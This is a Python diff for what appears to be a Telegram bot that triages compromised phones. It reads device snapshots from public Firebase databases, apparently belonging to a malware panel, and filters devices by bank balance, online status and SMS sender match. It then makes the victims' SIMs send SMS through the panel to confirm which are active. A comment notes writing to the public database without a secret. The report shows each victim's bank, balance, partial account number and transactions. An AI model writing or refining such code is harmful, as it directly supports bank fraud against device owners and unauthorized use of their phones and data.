@@ -1001,7 +1001,7 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     rs = selected(records)
     allowed_senders = store.senders()
 
-    # Balance ≥ threshold first
+    # Always apply the ≥ BALANCE_THRESHOLD filter first
     rs = [r for r in rs if r.available_balance >= BALANCE_THRESHOLD]
 
     if mode == "matched":
@@ -1009,6 +1009,7 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     elif mode == "no_match":
         shown = [r for r in rs if not _sender_match(r.sender_ids, allowed_senders)]
     elif mode == "online_no_match":
+        # Default: ONLINE only + Sender Match NO only
         shown = [
             r for r in rs
             if r.online == "online" and not _sender_match(r.sender_ids, allowed_senders)
@@ -1022,63 +1023,55 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     else:
         shown = rs
 
-    # highest balance first
-    shown = sorted(shown, key=lambda r: r.available_balance, reverse=True)
+    # STRICT: hide if neither SIM was confirmed ACTIVE (queue alone is not enough)
+    shown = [r for r in shown if r.sim1_active or r.sim2_active]
 
-    s = stats(selected(records))
+    s = stats(selected(records))  # original full stats for reference
     source_url = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/") or "(not configured)"
-    thr = int(BALANCE_THRESHOLD)
-    senders_txt = " · ".join(sorted(allowed_senders)) if allowed_senders else "—"
-
     out = [
-        f"<b>✦ DEVICE REPORT · ₹{thr:,}+ ✦</b>",
-        "━━━━━━━━━━━━━━━━━━",
+        f"<b>✦ DEVICE REPORT (≥ ₹{int(BALANCE_THRESHOLD)}) ✦</b>",
+        f"Firebase URL: {esc(source_url)}",
+        f"Checked: <b>{s['total']}</b> | Online: {s['online']} | Offline: {s['offline']}",
+        f"With Balance ≥ ₹{int(BALANCE_THRESHOLD)}: <b>{s['with_balance_ge_threshold']}</b>",
+        f"Configured sender IDs: {esc(', '.join(sorted(allowed_senders)) or '(none)')}",
+        f"Mode: {esc(mode)}",
         "",
-        f"🌐 <b>Firebase</b>\n<code>{esc(source_url)}</code>",
-        "",
-        f"📊 Checked: <b>{s['total']}</b>",
-        f"🟢 Online: <b>{s['online']}</b>   🔴 Offline: <b>{s['offline']}</b>",
-        f"💰 Balance ≥ ₹{thr:,}: <b>{s['with_balance_ge_threshold']}</b>",
-        f"📋 Showing: <b>{len(shown)}</b>  ·  Mode: <code>{esc(mode)}</code>",
-        f"📡 Senders: {esc(senders_txt)}",
-        "━━━━━━━━━━━━━━━━━━",
     ]
     if not shown:
-        out += ["", f"❌ No devices found for this filter (≥ ₹{thr:,})."]
-        return "\n".join(out)
-
+        out.append(
+            f"No devices with verified SIM ACTIVE "
+            f"(filter: ≥ ₹{int(BALANCE_THRESHOLD)}"
+            + (", Online only" if mode in {"online", "online_no_match"} else "")
+            + (", Match NO only" if mode in {"no_match", "online_no_match"} else "")
+            + ")."
+        )
     for i, r in enumerate(shown[:MAX_ROWS], 1):
         matched = _sender_match(r.sender_ids, allowed_senders)
-        bal_line = f"₹{r.available_balance:,.2f}"
+        bal_line = f"₹{r.available_balance:,.2f}" if r.available_balance else "—"
         bank_line = r.bank_name or "—"
         acct = f"••{r.account_last4}" if r.account_last4 else "—"
-        txn = "—"
+        txn = ""
         if r.transaction_amount:
-            sign = "+" if r.transaction_type == "credit" else "−"
-            txn = f"{sign}₹{r.transaction_amount}"
-            if r.transaction_type:
-                txn += f" ({r.transaction_type})"
-        online_icon = "🟢" if r.online == "online" else ("🔴" if r.online == "offline" else "⚪")
-        did = r.device_id or r.client_id or r.identity
+            sign = "+" if r.transaction_type == "credit" else "-"
+            txn = f"{sign}₹{r.transaction_amount} ({r.transaction_type or '?'})"
+
+        # Hide "Sender match: YES" noise when user wants only NO; still show for clarity as NO
+        match_label = "NO" if not matched else "YES"
         sim_parts = []
         if r.sim1_active:
             sim_parts.append("SIM 1 ACTIVE")
         if r.sim2_active:
             sim_parts.append("SIM 2 ACTIVE")
-        sim_line = " · ".join(sim_parts) if sim_parts else "SIM: not confirmed"
-        out += [
-            "",
-            f"<b>{i}. <code>{esc(did)}</code></b>",
-            f"🏦 {esc(bank_line)}  ·  💰 <b>{esc(bal_line)}</b>  ·  💳 {esc(acct)}",
-            f"📨 Txn: {esc(txn)}  ·  Match: {'YES' if matched else 'NO'}",
-            f"{online_icon} {esc(r.online)}  ·  🔋 {esc(r.battery or '—')}  ·  📶 {esc(r.network or '—')}",
-            f"📱 <b>{esc(sim_line)}</b>",
-        ]
-        if r.last_seen:
-            out.append(f"🕐 {esc(r.last_seen)}")
-    if len(shown) > MAX_ROWS:
-        out += ["", f"… +{len(shown) - MAX_ROWS} more"]
-    return "\n".join(out)
+        sim_line = " | ".join(sim_parts) if sim_parts else "SIM: not verified"
+        out.append(
+            f"<b>{i}. {esc(r.device_id or r.client_id or r.identity)}</b> — Sender match: {match_label}\n"
+            f"Bank: {esc(bank_line)} | Balance: <b>{esc(bal_line)}</b> | A/C: {esc(acct)}\n"
+            f"Txn: {esc(txn or '—')} | Network: {esc(r.network)} | Online: {esc(r.online)}\n"
+            f"Battery: {esc(r.battery)} | Last seen: {esc(r.last_seen)}\n"
+            f"<b>{esc(sim_line)}</b>\n"
+            f"Source: <code>{esc(r.source_path)}</code>"
+        )
+    return "\n\n".join(out)
 
 
 def report_keyboard() -> InlineKeyboardMarkup:
@@ -1424,23 +1417,23 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
 
             records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
 
-            # SMS SIM-check ON by default (send SIM1/SIM2 → inbox / isSended)
-            # Disable with ENABLE_SMS_CHECK=0
-            sms_on = os.getenv("ENABLE_SMS_CHECK", "1").strip().lower() not in {"0", "false", "no", "off"}
-            if sms_on:
-                need_check = sum(
-                    1 for r in records
-                    if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+            # Automatic SIM SMS check (Panel webhookEvent/sendSms + isSended/inbox confirm)
+            # ERA Firebase is public — write without secret first
+            need_check = sum(
+                1 for r in records
+                if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+            )
+            will_check = min(need_check, MAX_SMS_CHECK_DEVICES)
+            if will_check:
+                await message.reply_text(
+                    f"SMS check: top {will_check}/{need_check} by balance "
+                    f"(SIM1 send→inbox, then SIM2) …"
                 )
-                will_check = min(need_check, MAX_SMS_CHECK_DEVICES)
-                if will_check:
-                    await message.reply_text(
-                        f"SMS check: top {will_check}/{need_check} "
-                        f"(SIM1 send→inbox, then SIM2) …"
-                    )
-                    await run_sms_checks_on_records(records, clients, devices)
-                    ok = sum(1 for r in records if r.sim1_active or r.sim2_active)
-                    await message.reply_text(f"SMS check done. SIM ACTIVE: {ok}/{will_check}")
+                await run_sms_checks_on_records(records, clients, devices)
+                ok = sum(1 for r in records if r.sim1_active or r.sim2_active)
+                await message.reply_text(
+                    f"SMS check done. Verified SIM ACTIVE: {ok}. Rest hidden."
+                )
 
             store.finish(sid, records, "completed")
             await reply_report(message, format_report(records, mode), with_buttons)
